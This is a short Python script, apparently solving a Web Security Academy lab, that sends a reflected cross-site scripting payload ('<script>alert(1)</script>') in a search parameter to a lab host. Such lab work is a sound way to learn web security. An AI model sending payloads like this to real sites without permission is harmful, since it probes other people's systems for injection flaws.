import requests
from bs4 import BeautifulSoup

site = 'ac841f181ffeeb62c0c760d3001a0080.web-security-academy.net'

s = requests.Session()
search_url = f'https://{site}/?search=<script>alert(1)</script>'
resp = s.get(search_url)